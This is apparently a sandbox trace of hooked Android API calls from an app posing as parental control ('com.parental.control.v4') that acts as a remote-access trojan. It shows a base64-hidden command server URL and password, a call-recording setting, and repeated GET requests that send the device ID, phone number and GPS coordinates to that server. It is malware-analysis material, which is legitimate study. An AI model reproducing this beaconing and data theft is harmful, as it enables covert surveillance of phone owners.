{"timestamp":1521070877830,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/cache"},"args":[]}
{"timestamp":1521070877837,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/cache"},"args":[]}
{"timestamp":1521070877858,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/cache\/com.android.renderscript.cache"},"args":[]}
{"timestamp":1521070877883,"result":{"mClass":"com.connect.MyService","mPackage":"com.parental.control.v4"},"class":"android.content.ContextWrapper","method":"startService","type":"binder","args":[{"cmp":"com.parental.control.v4\/com.connect.MyService"}]}
{"timestamp":1521070877914,"result":"false","class":"android.os.SystemProperties","method":"get","type":"content","args":["viewancestor.profile_rendering","false"]}
{"timestamp":1521070877929,"result":"false","class":"android.os.SystemProperties","method":"get","type":"content","args":["debug.hwui.disable_vsync","false"]}
{"timestamp":1521070877932,"result":"false","class":"android.os.SystemProperties","method":"get","type":"content","args":["debug.hwui.profile","false"]}
{"timestamp":1521070877939,"result":"false","class":"android.os.SystemProperties","method":"get","type":"content","args":["debug.hwui.show_dirty_regions","false"]}
{"timestamp":1521070877961,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/vendor\/lib\/libmedia_jni.so"},"args":[]}
{"timestamp":1521070877965,"result":"true","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/system\/lib\/libmedia_jni.so"},"args":[]}
{"timestamp":1521070877999,"class":"android.app.ContextImpl","method":"registerReceiver","type":"binder","args":["com.connect.ServiceReceiver@41087aa0",{"mPriority":0,"mActions":["android.intent.action.BOOT_COMPLETED","android.intent.action.SCREEN_OFF"],"mHasPartialTypes":false}]}
{"timestamp":1521070878025,"class":"android.app.ContextImpl","method":"registerReceiver","type":"binder","args":["com.connect.ServiceReceiver@41087aa0",{"mPriority":0,"mActions":["android.intent.action.BOOT_COMPLETED","android.intent.action.SCREEN_OFF"],"mHasPartialTypes":false}]}
{"timestamp":1521070878146,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml.bak"},"args":[]}
{"timestamp":1521070878150,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml"},"args":[]}
{"timestamp":1521070878167,"result":{"mModified":{"inacall":0},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putLong","type":"globals","args":["inacall","0"]}
{"timestamp":1521070878173,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml"},"args":[]}
{"timestamp":1521070878187,"result":{"descriptor":44},"class":"libcore.io.IoBridge","method":"open","type":"file","args":["\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml","577"]}
{"timestamp":1521070878208,"result":{"mModified":{"Timeout":10000},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putInt","type":"globals","args":["Timeout","10000"]}
{"timestamp":1521070878212,"result":"true","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml"},"args":[]}
{"timestamp":1521070878220,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml.bak"},"args":[]}
{"timestamp":1521070878229,"result":{"descriptor":44},"class":"libcore.io.IoBridge","method":"open","type":"file","args":["\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml","577"]}
{"timestamp":1521070878244,"result":{"mModified":{"RecordCalls":true},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putBoolean","type":"globals","args":["RecordCalls","true"]}
{"timestamp":1521070878248,"result":"true","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml"},"args":[]}
{"timestamp":1521070878261,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml.bak"},"args":[]}
{"timestamp":1521070878265,"result":{"descriptor":44},"class":"libcore.io.IoBridge","method":"open","type":"file","args":["\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml","577"]}
{"timestamp":1521070878281,"result":{"mModified":{"intercept":false},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putBoolean","type":"globals","args":["intercept","false"]}
{"timestamp":1521070878284,"result":"true","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml"},"args":[]}
{"timestamp":1521070878297,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml.bak"},"args":[]}
{"timestamp":1521070878301,"result":{"descriptor":44},"class":"libcore.io.IoBridge","method":"open","type":"file","args":["\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml","577"]}
{"timestamp":1521070878316,"result":{"mModified":{"AndroidID":"5056ad7d6c8edd62"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["AndroidID","5056ad7d6c8edd62"]}
{"timestamp":1521070878320,"result":"true","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml"},"args":[]}
{"timestamp":1521070878333,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml.bak"},"args":[]}
{"timestamp":1521070878358,"result":{"descriptor":44},"class":"libcore.io.IoBridge","method":"open","type":"file","args":["\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml","577"]}
{"timestamp":1521070878387,"result":{"mModified":{"File":"\/mnt\/sdcard\/System"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["File","\/mnt\/sdcard\/System"]}
{"timestamp":1521070878391,"result":"true","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml"},"args":[]}
{"timestamp":1521070878404,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml.bak"},"args":[]}
{"timestamp":1521070878409,"result":{"descriptor":44},"class":"libcore.io.IoBridge","method":"open","type":"file","args":["\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml","577"]}
{"timestamp":1521070878424,"result":{"mModified":{"urlPost":"\/message.php?"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["urlPost","\/message.php?"]}
{"timestamp":1521070878428,"result":"true","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml"},"args":[]}
{"timestamp":1521070878441,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml.bak"},"args":[]}
{"timestamp":1521070878445,"result":{"descriptor":44},"class":"libcore.io.IoBridge","method":"open","type":"file","args":["\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml","577"]}
{"timestamp":1521070878460,"result":{"mModified":{"backupURL":"aHR0cDovL3BpenphY2hpcC5jb20vcmF0"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["backupURL","aHR0cDovL3BpenphY2hpcC5jb20vcmF0"]}
{"timestamp":1521070878465,"result":"true","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml"},"args":[]}
{"timestamp":1521070878478,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml.bak"},"args":[]}
{"timestamp":1521070878482,"result":{"descriptor":44},"class":"libcore.io.IoBridge","method":"open","type":"file","args":["\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml","577"]}
{"timestamp":1521070878536,"result":{"mModified":{"Start":true},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putBoolean","type":"globals","args":["Start","true"]}
{"timestamp":1521070878580,"result":{"mModified":{"Media":false},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putBoolean","type":"globals","args":["Media","false"]}
{"timestamp":1521070878605,"result":{"mModified":{"Files":false},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putBoolean","type":"globals","args":["Files","false"]}
{"timestamp":1521070878622,"result":"","class":"android.os.SystemProperties","method":"get","type":"content","args":["debug.hwui.print_config",""]}
{"timestamp":1521070878630,"result":"true","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml"},"args":[]}
{"timestamp":1521070878691,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml.bak"},"args":[]}
{"timestamp":1521070878713,"result":{"descriptor":50},"class":"libcore.io.IoBridge","method":"open","type":"file","args":["\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml","577"]}
{"timestamp":1521070878910,"result":{"mModified":{"URL":"aHR0cDovL3BpenphY2hpcC5jb20vcmF0"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["URL","aHR0cDovL3BpenphY2hpcC5jb20vcmF0"]}
{"timestamp":1521070878957,"result":"true","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml"},"args":[]}
{"timestamp":1521070878967,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml.bak"},"args":[]}
{"timestamp":1521070879089,"result":{"descriptor":50},"class":"libcore.io.IoBridge","method":"open","type":"file","args":["\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml","577"]}
{"timestamp":1521070879158,"result":{"mModified":{"backupURL":"aHR0cDovL3BpenphY2hpcC5jb20vcmF0"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["backupURL","aHR0cDovL3BpenphY2hpcC5jb20vcmF0"]}
{"timestamp":1521070879182,"result":"true","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml"},"args":[]}
{"timestamp":1521070879236,"result":{"mModified":{"password":"a2V5bGltZXBpZQ=="},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["password","a2V5bGltZXBpZQ=="]}
{"timestamp":1521070879285,"result":"true","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml"},"args":[]}
{"timestamp":1521070879409,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml.bak"},"args":[]}
{"timestamp":1521070879429,"result":{"descriptor":50},"class":"libcore.io.IoBridge","method":"open","type":"file","args":["\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml","577"]}
{"timestamp":1521070879459,"result":{"mModified":{"androidId":"5056ad7d6c8edd62"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["androidId","5056ad7d6c8edd62"]}
{"timestamp":1521070879464,"result":"true","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml"},"args":[]}
{"timestamp":1521070879487,"result":"false","class":"java.io.File","method":"exists","type":"file","this":{"path":"\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml.bak"},"args":[]}
{"timestamp":1521070879501,"result":{"descriptor":50},"class":"libcore.io.IoBridge","method":"open","type":"file","args":["\/data\/data\/com.parental.control.v4\/shared_prefs\/com.parental.control.v4_preferences.xml","577"]}
{"timestamp":1521070879528,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0","32","0"]}
{"timestamp":1521070879548,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1521070879558,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1521070879567,"result":"keylimepie","class":"android.util.Base64","method":"decode","type":"generic","args":["a2V5bGltZXBpZQ==","0","16","0"]}
{"timestamp":1521070879580,"result":"keylimepie","class":"android.util.Base64","method":"decode","type":"generic","args":["a2V5bGltZXBpZQ==","0"]}
{"timestamp":1521070879600,"result":"keylimepie","class":"android.util.Base64","method":"decode","type":"generic","args":["a2V5bGltZXBpZQ==","0"]}
{"timestamp":1521070879620,"result":["CONNECTING","CONNECTED","SUSPENDED","DISCONNECTING","DISCONNECTED","UNKNOWN"],"hooked_method":"values","hooked_class":"","args":[],"class":"java.lang.reflect.Method","method":"invoke","type":"reflection"}
{"timestamp":1521070879633,"result":"Android","class":"android.os.SystemProperties","method":"get","type":"content","args":["gsm.operator.alpha"]}
{"timestamp":1521070879642,"result":"Android","class":"android.telephony.TelephonyManager","method":"getNetworkOperatorName","type":"fingerprint","args":[]}
{"timestamp":1521070879654,"result":"15555215554","class":"android.telephony.TelephonyManager","method":"getLine1Number","type":"fingerprint","args":[]}
{"timestamp":1521070879675,"result":"America\/New_York","class":"android.os.SystemProperties","method":"get","type":"content","args":["persist.sys.timezone"]}
{"timestamp":1521070879819,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com"]}
{"timestamp":1521070879936,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat"]}
{"timestamp":1521070880026,"result":"HTTP\/1.1 500 Internal Server Error","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":[{"port":-1,"lcHostname":"pizzachip.com","hostname":"pizzachip.com","schemeName":"http"},"GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=null,null&Device=Nexus5&Sdk=16&Version=1&Random=256&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070880056,"result":"HTTP\/1.1 500 Internal Server Error","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=null,null&Device=Nexus5&Sdk=16&Version=1&Random=256&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070880095,"result":"HTTP\/1.1 500 Internal Server Error","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=null,null&Device=Nexus5&Sdk=16&Version=1&Random=256&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070880113,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie"]}
{"timestamp":1521070880103,"result":{"request_method":"GET","response_message":"Internal Server Error","url":"http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie","version":"HTTP\/1.1","response_code":500},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie","args":[]}
{"timestamp":1521070879913,"result":{"request_method":"GET","response_message":"Found","url":"https:\/\/www.hugedomains.com\/domain_profile.cfm?d=pizzachip&e=com","version":"HTTP\/1.1","response_code":302},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat","args":[]}
{"timestamp":1521070880201,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0","32","0"]}
{"timestamp":1521070880214,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1521070880223,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1521070880231,"result":{"mModified":{"URL":"http:\/\/pizzachip.com\/rat"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["URL","http:\/\/pizzachip.com\/rat"]}
{"timestamp":1521070890208,"result":"Android","class":"android.os.SystemProperties","method":"get","type":"content","args":["gsm.operator.alpha"]}
{"timestamp":1521070890212,"result":"Android","class":"android.telephony.TelephonyManager","method":"getNetworkOperatorName","type":"fingerprint","args":[]}
{"timestamp":1521070890229,"result":"15555215554","class":"android.telephony.TelephonyManager","method":"getLine1Number","type":"fingerprint","args":[]}
{"timestamp":1521070890242,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat"]}
{"timestamp":1521070890260,"result":"37.421998333333335","class":"android.location.Location","method":"getLatitude","type":"content","args":[]}
{"timestamp":1521070890302,"result":"-122.08400000000002","class":"android.location.Location","method":"getLongitude","type":"content","args":[]}
{"timestamp":1521070890368,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com"]}
{"timestamp":1521070890241,"result":{"request_method":"GET","response_message":"Internal Server Error","url":"http:\/\/pizzachip.com\/rat","version":"HTTP\/1.1","response_code":500},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat","args":[]}
{"timestamp":1521070890450,"result":"HTTP\/1.1 500 Internal Server Error","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":[{"port":-1,"lcHostname":"pizzachip.com","hostname":"pizzachip.com","schemeName":"http"},"GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=224&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070890460,"result":"HTTP\/1.1 500 Internal Server Error","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=224&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070890409,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0","32","0"]}
{"timestamp":1521070890491,"result":"HTTP\/1.1 500 Internal Server Error","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=224&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070890608,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie"]}
{"timestamp":1521070890619,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1521070890660,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1521070890607,"result":{"request_method":"GET","response_message":"Internal Server Error","url":"http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie","version":"HTTP\/1.1","response_code":500},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie","args":[]}
{"timestamp":1521070890731,"result":{"mModified":{"URL":"http:\/\/pizzachip.com\/rat"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["URL","http:\/\/pizzachip.com\/rat"]}
{"timestamp":1521070896668,"result":"false","class":"android.os.SystemProperties","method":"get","type":"content","args":["viewancestor.profile_rendering","false"]}
{"timestamp":1521070896714,"result":"false","class":"android.os.SystemProperties","method":"get","type":"content","args":["debug.hwui.disable_vsync","false"]}
{"timestamp":1521070896718,"result":"false","class":"android.os.SystemProperties","method":"get","type":"content","args":["debug.hwui.profile","false"]}
{"timestamp":1521070896738,"result":"false","class":"android.os.SystemProperties","method":"get","type":"content","args":["debug.hwui.show_dirty_regions","false"]}
{"timestamp":1521070900708,"result":"Android","class":"android.os.SystemProperties","method":"get","type":"content","args":["gsm.operator.alpha"]}
{"timestamp":1521070900711,"result":"Android","class":"android.telephony.TelephonyManager","method":"getNetworkOperatorName","type":"fingerprint","args":[]}
{"timestamp":1521070900726,"result":"15555215554","class":"android.telephony.TelephonyManager","method":"getLine1Number","type":"fingerprint","args":[]}
{"timestamp":1521070900736,"result":"37.421998333333335","class":"android.location.Location","method":"getLatitude","type":"content","args":[]}
{"timestamp":1521070900742,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat"]}
{"timestamp":1521070900753,"result":"-122.08400000000002","class":"android.location.Location","method":"getLongitude","type":"content","args":[]}
{"timestamp":1521070900776,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com"]}
{"timestamp":1521070900741,"result":{"request_method":"GET","response_message":"Found","url":"https:\/\/www.hugedomains.com\/domain_profile.cfm?d=pizzachip&e=com","version":"HTTP\/1.1","response_code":302},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat","args":[]}
{"timestamp":1521070900849,"result":"HTTP\/1.1 500 Internal Server Error","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":[{"port":-1,"lcHostname":"pizzachip.com","hostname":"pizzachip.com","schemeName":"http"},"GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=889&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070900861,"result":"HTTP\/1.1 500 Internal Server Error","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=889&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070900877,"result":"HTTP\/1.1 500 Internal Server Error","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=889&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070900845,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0","32","0"]}
{"timestamp":1521070900893,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie"]}
{"timestamp":1521070900910,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1521070900892,"result":{"request_method":"GET","response_message":"Internal Server Error","url":"http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie","version":"HTTP\/1.1","response_code":500},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie","args":[]}
{"timestamp":1521070900920,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1521070901006,"result":{"mModified":{"URL":"http:\/\/pizzachip.com\/rat"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["URL","http:\/\/pizzachip.com\/rat"]}
{"timestamp":1521070910997,"result":"Android","class":"android.os.SystemProperties","method":"get","type":"content","args":["gsm.operator.alpha"]}
{"timestamp":1521070911001,"result":"Android","class":"android.telephony.TelephonyManager","method":"getNetworkOperatorName","type":"fingerprint","args":[]}
{"timestamp":1521070911017,"result":"15555215554","class":"android.telephony.TelephonyManager","method":"getLine1Number","type":"fingerprint","args":[]}
{"timestamp":1521070911040,"result":"37.421998333333335","class":"android.location.Location","method":"getLatitude","type":"content","args":[]}
{"timestamp":1521070911043,"result":"-122.08400000000002","class":"android.location.Location","method":"getLongitude","type":"content","args":[]}
{"timestamp":1521070911078,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com"]}
{"timestamp":1521070911058,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat"]}
{"timestamp":1521070911170,"result":"HTTP\/1.1 500 Internal Server Error","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":[{"port":-1,"lcHostname":"pizzachip.com","hostname":"pizzachip.com","schemeName":"http"},"GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=809&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070911177,"result":"HTTP\/1.1 500 Internal Server Error","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=809&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070911230,"result":"HTTP\/1.1 500 Internal Server Error","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=809&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1521070911269,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie"]}
{"timestamp":1521070911268,"result":{"request_method":"GET","response_message":"Internal Server Error","url":"http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie","version":"HTTP\/1.1","response_code":500},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie","args":[]}
{"timestamp":1521070911057,"result":{"request_method":"GET","response_message":"Internal Server Error","url":"http:\/\/pizzachip.com\/rat","version":"HTTP\/1.1","response_code":500},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat","args":[]}
